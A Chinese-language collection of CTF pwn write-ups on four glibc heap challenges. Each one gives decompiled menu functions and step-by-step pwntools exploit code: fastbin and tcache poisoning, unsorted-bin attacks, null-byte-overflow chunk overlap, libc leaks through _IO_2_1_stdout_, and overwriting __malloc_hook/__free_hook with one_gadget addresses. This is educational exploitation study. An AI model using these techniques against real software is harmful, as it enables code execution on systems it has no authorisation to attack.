## babyheap\_0ctf\_2017


# fastbin #unosrtedbin\_attack


### 源码

![Pasted image 20250824104832.png](../../images/Pasted%20image%2020250824104832.png)
菜单题，功能分别为：
- 申请内存
- 填充内容
- 释放空间
- 打印内容


#### 申请内存allocate


```python
void __fastcall allocate(node *a1)
{
  int i; // [rsp+10h] [rbp-10h]
  int v2; // [rsp+14h] [rbp-Ch]
  void *v3; // [rsp+18h] [rbp-8h]

  for ( i = 0; i <= 15; ++i )
  {
    if ( !a1[i].used )
    {
      printf("Size: ");
      v2 = my_read();
      if ( v2 > 0 )
      {
        if ( v2 > 4096 )
          v2 = 4096;    //最多分配1kb内存
        v3 = calloc(v2, 1uLL);                  // 分配出来的都是 0 
        if ( !v3 )
          exit(-1);
        a1[i].used = 1;
        a1[i].size = v2;
        a1[i].addr = v3;
        printf("Allocate Index %d\n", i);
      }
      return;
    }
  }
}
```


#### 添加内容fill


```python
__int64 __fastcall fill(node *a1)
{
  __int64 result; // rax
  int v2; // [rsp+18h] [rbp-8h]
  int v3; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  result = my_read();          // 自行指定长度，存在严重漏洞,可以溢出
  v2 = result;
  if ( result < 0x10 )
  {
    result = a1[result].used;
    if ( result == 1 )
    {
      printf("Size: ");
      result = my_read();
      v3 = result;
      if ( result > 0 )
      {
        printf("Content: ");
        return sub_11B2(a1[v2].addr, v3);
      }
    }
  }
  return result;
}
```


#### 释放内存free


```python
__int64 __fastcall free_0(node *a1)
{
  __int64 result; // rax
  int v2; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  result = my_read();
  v2 = result;
  if ( result < 0x10 )
  {
    result = a1[result].used;
    if ( result == 1 )
    {
      a1[v2].used = 0;
      a1[v2].size = 0LL;
      free(a1[v2].addr);
      result = &a1[v2];
      *(result + 16) = 0LL;//没有ua可以用
    }
  }
  return result;
}
```


#### 打印内容dump


```python
unsigned int __fastcall dunp(node *a1)
{
  unsigned int result; // eax
  unsigned int v2; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  result = my_read();
  v2 = result;
  if ( result < 0x10 )
  {
    result = a1[result].used;
    if ( result == 1 )
    {
      puts("Content: ");
      sub_130F(a1[v2].addr, a1[v2].size);
      return puts(byte_14F1);
    }
  }
  return result;
}
```


### 思路

泄露unsortedbin的地址计算libc，然后覆写malloc\_hook为ogg


#### 泄露unsortedbin地址

泄露unsortedbin的地址就需要存在指针指向unsortedbin


```
allo(0x10)    # idx=0,addr=0
allo(0x10)    # idx=1,addr=0x20
allo(0x10)    # idx=2,addr=0x40
allo(0x10)    # idx=3,addr=0x60
allo(0x80)    # idx=4,addr=0x80
```

申请4个0x10大小的内存(带上前缀内容，总计0x80字节大小)，申请后如下

![Pasted image 20250824131302.png](../../images/Pasted%20image%2020250824131302.png)

然后释放2和1，我们可以通过写0来覆盖内容


```
free(2)
free(1)
payload = b'a'*0x10+p64(0)+p64(0x21)+p8(0x80)
```

![Pasted image 20250824131607.png](../../images/Pasted%20image%2020250824131607.png)![Pasted image 20250824131824.png](../../images/Pasted%20image%2020250824131824.png)

这里p8(0x80)是为了改写已经被释放的chunk\_1的fd指针，让它指向chunk\_4，这样的话就实现两个指针指向同一个chunk

然后覆写chunk\_4，让fastbin以为这是0x20大小的，并申请内存


```
payload = b'a'*0x10+p64(0)+p64(0x21)
fill(3,payload)
allo(0x10)    ##idx=1'
allo(0x10)    ##idx=2'
```

效果如下：

![Pasted image 20250824132346.png](../../images/Pasted%20image%2020250824132346.png)

然后覆写3，将4号复原，这样的话我们就算释放了4号，也有一个2'指向chunk\_4，然后dump(2)就可以打印出来unsortedbin的地址了

释放chunk\_4之前需要申请一个同大小的chunk\_5，防止被放回top\_chunk中


```
payload = b'a'*0x10+p64(0)+p64(0x91)
fill(3,payload)
allo(0x80)
free(4)
dump(2)
```

![Pasted image 20250824133314.png](../../images/Pasted%20image%2020250824133314.png)

当unsortedbin中只有一个chunk的时候，他的fd和bk是一样的，指向unsortedbin的首个

![Pasted image 20250824133540.png](../../images/Pasted%20image%2020250824133540.png)

计算得到偏移`0x3c4b78`


```
p.recvuntil(b'Content: \n')
leak_addr = u64(p.recv(8))
libc_base = leak_addr - 0x3c4b78
log.success("libc_base:"+hex(libc_base))
```


#### 覆写malloc\_hook

一般malloc\_hook申请的fake\_chunk都是0x7f，所以这里申请0x60大小的内容，然后找哪里可以造fake\_chunk

![Pasted image 20250824134340.png](../../images/Pasted%20image%2020250824134340.png)

malloc\_hook处偏移，fake\_chunk地址计算可得

需要注意的是应该留下fd和bk的位置，所以应该是$0x33$


```
allo(0x60)   # 重新申请chunk_4,大小符合条件
free(4)      # 释放到fastbin中，这样可以写fd为fake_chunk的地址
payload = b'a'*0x13+p64(libc_base+0x3c4b20-0x33)
fill(2,payload)    # 2指的就是4
```

![Pasted image 20250824135246.png](../../images/Pasted%20image%2020250824135246.png)

fastbin中有一个在heap区的地址，还有一个在fake\_chunk的地址，所以申请两次


```
allo(0x60)   # idx=4
allo(0x60)   # idx=6
payload = b'a'*0x13+p64(ogg+libc_base)
fill(6,payload)
```

![Pasted image 20250824140358.png](../../images/Pasted%20image%2020250824140358.png)

将\_\_malloc\_hook覆写为了ogg，这样当我们执行内存申请的时候，调用\_\_malloc\_hook就会跳转ogg


## HITCON Training lab14 magic\_heap


# unosrtedbin\_attack


### 基本功能：

- 创建堆，根据用户指定的大小申请相应堆，读入指定长度的内容，为设置NULL
- 编辑堆，如果堆非空，就根据用户读入的大小修改堆内容，可以堆溢出
- 删除堆，如果堆非空，就释放并且置NULL

v3=4869且magic大于4869的时候可以得到flag


### 思路

直接ub attack就行：
1. 释放一个堆块到ub中
2. 利用堆溢出漏洞修改bk的指针为`&magic-0x10`
3. 触发漏洞


##### 释放一个堆块到ub中

先创建几个堆块，有一个大一些，进入ub里


```
create(0x20,b'data')    # idx=0
create(0x80,b'data')    # idx=1
create(0x20,b'data')    # idx=2
delete(1)
```

这里创建chunk2是为了防止ub释放后被合并到top\_chunk中

![Pasted image 20250824230527.png](../../images/Pasted%20image%2020250824230527.png)


##### 利用堆溢出漏洞修改bk为&maigc-0x10

按照堆布局，从chunk0处开始写就好了


```
magic = 0x6020c0
bk = magic - 0x10
fd = 0
payload = b'a'*0x20+p64(0)+p64(0x91)+p64(fd)+p64(bk)
edit(0,payload)
```

![Pasted image 20250824230717.png](../../images/Pasted%20image%2020250824230717.png)


##### 从ub中申请chunk1，覆写数据


```
create(0x80,b'data')
```

![Pasted image 20250824231109.png](../../images/Pasted%20image%2020250824231109.png)

接着输入v3就cat flag


## LCTF2018 easy\_heap


# uaf #tcache\_attack #unosrtedbin\_attack #null\_byte\_overflow #overlapping\_heap\_chunk #无edit


### 源码分析

![Pasted image 20250826183320.png](../../images/Pasted%20image%2020250826183320.png)
菜单题，功能有：
- 分配内存并写入内容
- 删除内容
- 打印内容


##### 分配内存并写入内容

![Pasted image 20250826201441.png](../../images/Pasted%20image%2020250826201441.png)
可以发现每次申请之后都会分配一个`0x100(0xf8+8)`字节的内存
但在`safe_read`中可以发现存在一个null\_byte\_overflow漏洞,如下


```c
char *__fastcall safe_read(char *a1, int a2)
{
  char *result; // rax
  unsigned int v3; // [rsp+1Ch] [rbp-4h]

  v3 = 0;
  if ( a2 )
  {
    while ( 1 )
    {
      read(0, &a1[v3], 1uLL);
      if ( a2 - 1 < v3 || !a1[v3] || a1[v3] == 10 )
        break;
      ++v3;
    }
    a1[v3] = 0;
    result = &a1[a2];
    *result = 0;                                // 如果a1的容量为a2，会多写一字节0
  }
  else
  {
    result = a1;
    *a1 = 0;
  }
  return result;
}
```


##### 删除内容并释放

![Pasted image 20250827122244.png](../../images/Pasted%20image%2020250827122244.png)
这里可以看到删除内容后指针置为了0，不能直接uaf或double free


##### 打印内容

![Pasted image 20250827122402.png](../../images/Pasted%20image%2020250827122402.png)
直接打印内容


### 攻击思路

由于存在null\_byte\_overflow，一般都会考虑`overlapping heap chunk`

null\_byte\_overflow漏洞的利用方法是通过溢出覆盖`prev_in_use`字节使得堆块进行合并，然后用伪造的`prev_size`字段使得合并时造成堆块交叉
由于本题输入函数无法输入NULL字符，所以无法输入prev\_size为0x00的值，而堆块分配大小固定，所以直接采用null\_byte\_overflow的方式无法进行利用，需要用其他方法

当无法手动写入的时候可以考虑系统写入的prev\_size
方法为：
在ub合并时会写入`prev_size`，而该`prev_size`不会被轻易覆盖，所以可以利用

具体利用过程：
1. `A->B->C`三块ub chunk 依次释放
2. A和B合并，C钱的prev\_size写入为0x200
3. A、B、C合并，0x200依然保持
4. ub切分出A
5. ub切分出B但不要覆盖之前的0x200
6. A再次释放为ub的堆块，使得fd和bk为有效链表指针
7. 此前C前的`prev_size`依然为0x200，`A(free)->B(allocated)->C(free)`,如果使得B溢出，则可以将已分配的B块包含在合并后释放状态的ub中


##### 重排堆块结构

由于存在tcache，而我们需要ub结构，所以先填满tcache


```python
for i in range(7):
    new(0x10,'{}'.format(i).encode()+b' - tcache')
for i in range(3):
    new(0x10,'{}'.format(i+7).encode()+b' - ub')

for i in range(6):
    dele(i)
dele(9)
for i in range(6,9):
    deke(i)
```

这里在$idx_5$和$idx_7$之间先释放一个$idx_9$，防止top chunk将ub块合并，然后我们得到的chunk布局如下：


```
+-----+
|     | <-- tcache perthread 结构体
+-----+
| ... | <-- 6 个 tcache 块,idx=0~5
+-----+
|  A  | <-- idx=6 ----|    
+-----+               |
|  B  | <-- idx=7 ----|-- 3 个 unsorted bin 块
+-----+               |
|  C  | <-- idx=8 ----|
+-----+
|     | <-- tcache 块，防止 top 合并
+-----+
| top |
|  .. |
```


##### NULL字节触发漏洞

从tcache中申请空，然后再从ub中申请


```python
for i in range(7):
    new(0x10,'{}'.format(i+7).encode()+b'-tcache')
new(0x10,b'7 - A')
new(0x10,b'8 - B')
new(0x10,b'9 - C')
```

此时的chunk布局


```
+-----+
|     | <-- tcache perthread 结构体
+-----+
| ... | <-- idx=0~5
+-----+
|  A  | <-- idx=7   
+-----+               
|  B  | <-- idx=8 
+-----+              
|  C  | <-- idx=9 
+-----+
|     | <-- idx=6
+-----+
| top |
|  .. |
```

然后将B写入tcache，A写入ub来获取fd和kb


```python
for i in range(6):
    dele(i)
dele(8)
dele(7)
```

此时的chunk布局


```
+-----+
|     | <-- tcache perthread 结构体
+-----+
| ... | <-- idx=0~5   tcache
+-----+
|  A  | <-- idx=7     ub   
+-----+               
|  B  | <-- idx=8     tcache
+-----+               
|  C  | <-- idx=9 
+-----+
|     | <-- idx=6
+-----+
| top |
|  .. |
```

由于B位于tcache的第一位，所以直接申请就是B,进行NULL字节溢出


```
new(0xf8, b'0 - overflow')
dele(6)    #释放防止合并的tcache
dele(9)    #合并
```

此时chunk布局


```
+-----+
|     | <-- tcache perthread 结构体
+-----+
| ... | <-- idx=0~5   tcache
+-----+
|  A  | <-- idx=7     ub------------|
+-----+                             |
|  B  | <-- idx=8     实际idx=0-----|--一个大free块
+-----+                             |
|  C  | <-- idx=9     ub------------|
+-----+
|     | <-- idx=6     tcache
+-----+
| top |
|  .. |
```


##### leak libc

将A从大free块中分配出来，就可以将libc内容落到B中，打印B就可以了


```python
for i in range(7):
    new(0x10,'{}'.format(i).encode()+b' - tcache')
new(0x10, b'8 - fillup')
dump(0)
leak_libc = u64(rl().strip().ljust(8,b'\x00'))
log.success("leak_libc:"+hex(leak_libc))
libc_base = leak_libc-0x3ebca0
log.success("libc_base:"+hex(libc_base))
```

此时的chunk布局


```
+-----+
|     | <-- tcache perthread 结构体
+-----+
| ... | <-- idx=1~6   
+-----+
|  A  | <-- idx=7     实际idx=8
+-----+                            
|  B  | <-- idx=8     实际idx=0----+
+-----+                            |----大free块
|  C  | <-- idx=9     ub-----------+
+-----+
|     | <-- idx=7     tcache
+-----+
| top |
|  .. |
```


##### uaf，ogg打free\_hook

此时B系统认为是free的，所以再次申请就可以双指针指向B，可以打uaf，(需要在tcache里面打)


```
new(0x10,b'9 - next')
```

chunk布局


```
+-----+
|     | <-- tcache perthread 结构体
+-----+
| ... | <-- idx=1~6   
+-----+
|  A  | <-- idx=7     实际idx=8
+-----+                            
|  B  | <-- idx=8     实际idx=0，idx=9
+-----+ 
|  C  | <-- idx=9     ub
+-----+
|     | <-- idx=7     tcache
+-----+
| top |
|  .. |
```

我们先删一个到tcache里面，这样打uaf的时候可以利用，防止tcache空了就不认了


```
dele(1)
dele(0)
dele(9)
```

打free\_hook


```
new(0x10,p64(libc.sym['__free_hook']+libc_base))# idx=0的，实际idx=0,修改接下来申请地址
new(0x10,b'a')# idx=9的，实际idx=1，占掉一个,后面free这个
ogg = libc_base+0x4f322
log.success("ogg:"+hex(ogg))
new(0x10,p64(ogg))#实际idx=2
dele(1)
```


## HITCON2018 babytcache


# tcache\_attack #unosrtedbin\_attack #无dump #null\_byte\_overflow #overlapping\_heap\_chunk

没有`dump`函数的话就需要考虑IO\_FILE相关

[做题技巧#_IO_do_write](../../IO_FILE/做题技巧/index.md)


### 源码分析

菜单题，功能有：
1. 创建一个堆块，创建时可写
2. 删除一个堆块，及时置零了，没法直接uaf


#### 创建堆块


```python
int new()
{
  _QWORD *v0; // rax
  int i; // [rsp+Ch] [rbp-14h]
  _BYTE *v3; // [rsp+10h] [rbp-10h]
  unsigned __int64 size; // [rsp+18h] [rbp-8h]

  for ( i = 0; ; ++i )
  {
    if ( i > 9 )
    {
      LODWORD(v0) = puts(":(");
      return (int)v0;
    }
    if ( !Node[i] )
      break;
  }
  printf("Size:");
  size = my_read();
  if ( size > 0x2000 )//大于0x2000时退出
    exit(-2);
  v3 = malloc(size);
  if ( !v3 )
    exit(-1);
  printf("Data:");
  sub_B88(v3, (unsigned int)size);
  v3[size] = 0;
  Node[i] = v3;
  v0 = content;
  content[i] = size;
  return (int)v0;
}
```

`sub_B88函数`如下:


```asm
/*
 *将读入的最后一个`\n`换为`0`,这就造成了字节溢出
 */

_BYTE *__fastcall sub_B88(__int64 a1, unsigned int a2)
{
  _BYTE *result; // rax
  int chk; // [rsp+1Ch] [rbp-4h]

  chk = __read_chk(0LL, a1, a2, a2);
  if ( chk <= 0 )
  {
    puts("read error");
    _exit(1);
  }
  result = (_BYTE *)*(unsigned __int8 *)(chk - 1LL + a1);
  if ( (_BYTE)result == 10 )
  {
    result = (_BYTE *)(chk - 1LL + a1);
    *result = 0;                                // null byte overflow
  }
  return result;
}
```


#### 删除堆块


```python
int delete()
{
  unsigned __int64 v1; // [rsp+8h] [rbp-8h]

  printf("Index:");
  v1 = my_read();
  if ( v1 > 9 )
    exit(-3);
  if ( Node[v1] )
  {
    memset(Node[v1], 0xDA, content[v1]);
    free(Node[v1]);
    Node[v1] = 0LL;
    content[v1] = 0LL;
  }
  return puts(":)");
}
```

什么都做了，似乎没有漏洞


### 攻击思路

不管怎么说，我们需要打印内容才能泄露地址，才能接下来继续进行，而打印内容就是控制IO\_FILE中`_IO_2_1_stdout_`中`_flags=0xfbad1800`打出libc

同上题，出现`null_byte_overflow`的时候一般考虑`overlapping_heap_chunk`实现堆重叠，从而实现任意改写

所以思路大致如下：
1. overlapping\_heap\_chunk实现任意地址写
2. 通过IO\_FILE泄露libc
3. ogg打free\_hook


##### 任意地址写的实现

我们可以申请出来一个合适大小的堆块，通过ub来实现


```
new(0x500-0x8,b'a')#idx=0,size=0x500
new(0x30,b'a')#idx=1,size=0x40
new(0x40,b'a')#idx=2,size=0x50
new(0x50,b'a')#idx=3,size=0x60
new(0x60,b'a')#idx=4,size=0x70
new(0x500-0x8,b'a')#idx=5,size=0x500
new(0x70,b'a')#idx=6,size=0x80
```

这里总共创建七个堆块，其中$idx_6$是为了防止和top\_chunk合并
接下来我们把$idx_5$的大小篡改为`0x40+0x50+0x60+0x70+0x500=0x660` ，就可以通过`dele(5)`实现堆二次分配


```
dele(4)#通过4的溢出修改5
new(0x68,b'a'*0x60+b'\x60\x06')#因为size=0x70，所以会从idx4的原chunk中分配，接下来覆盖到idx5的size段就可以了
dele(0)#释放时会检查第一个，所以第一个不要释放5号
dele(5)#释放5，让堆管理器认为有一个0x660大小的chunk被释放,又因释放了0x500的另一个chunk，所以chunk合并为0xB60
dele(2)#释放一个tcache，size=0x50
```

此时，idx0、2、5被释放，tcache中有一个0x50大小

```
new(0x530)#idx=0,此时开始构造堆重叠，因为我们要把idx1也给覆盖进去，所以我们申请0x500+0x40-0x10=0x530大小,大chunk此时为0x620
dele(4)#释放一个tcache,size=0x70
```

此时idx2、4、5被释放
此时堆管理器认为的堆块：从idx2的起始地址开始，一直到idx5的结束地址，都是空的，可分配内存
我们之前释放了

我们可以尝试覆写地址如下
![Pasted image 20250901164119.png](../../images/Pasted%20image%2020250901164119.png)
0x790处为idx2的起点，我们可以写到0x71(也就是idx4的前面)
大小为`0x848-0x790-0x10=0xa8`，然后partial write，将`fd`覆写成IO的地址


```
pwndbg> p &_IO_2_1_stdout_
$1 = (<data variable, no debug info> *) 0x7ffff7dd0760 <_IO_2_1_stdout_>
```


```
new(0xa8,b'\x60\x07')
```

此时，idx2的fd被写为了`0x7ffff7dd0760(_IO_2_1_stdout_)`，我们查看tcachebins如下：


```
pwndbg> bins
tcachebins
0x50 [  1]: 0x555555a017a0 —▸ 0x7ffff7dd0760 (_IO_2_1_stdout_) ◂— ...
0x70 [  1]: 0x555555a01850 —▸ 0x7ffff7dcfca0 ◂— ...
fastbins
empty
unsortedbin
all: 0x555555a01840 —▸ 0x7ffff7dcfca0 ◂— 0x555555a01840
smallbins
empty
largebins
empty
```

那么我们申请的第二个size=0x50的tcache就可以到`_IO_2_1_stdout_`中,也就是实现了任意地址写


##### IO\_FILE泄露libc

根据之前的分析和\_IO\_FILE结构体，我们知道我们需要覆盖掉\_IO\_FILE结构体的参数

[IO_FILE源码#struct _IO_FILE](../../IO_FILE/IO_FILE源码/index.md)


```
new(0x40)
new(0x40,p64(0xfbad1800)+p64(0)*3+b'\x00')
```

于是我们的\_IO\_FILE被这样改造


```asm
strcut _IO_FILE {
    int _flags = 0xfbad1800;
    char* _IO_read_ptr = 0;    /* Current read pointer */
    char* _IO_read_end = 0;    /* End of get area. */
    char* _IO_read_base = 0;    /* Start of putback+get area. */
    char* _IO_write_base = {}\x00;    /* Start of put area. */
    ......
```

成功泄露libc


```
p.recv(8)
libc_base = u64(p.recv(6).ljust(8,b'\x00'))-0x3ed8b0
```


##### 打free\_hook


```
ogg = libc_base + 0x4f322
new(0xa0,p64(libc_base+libc.sym['__free_hook']))#改fd=free_hook
new(0x60)#释放一个tcache
new(0x60,p64(ogg))#写入ogg
dele(1)#执行
```
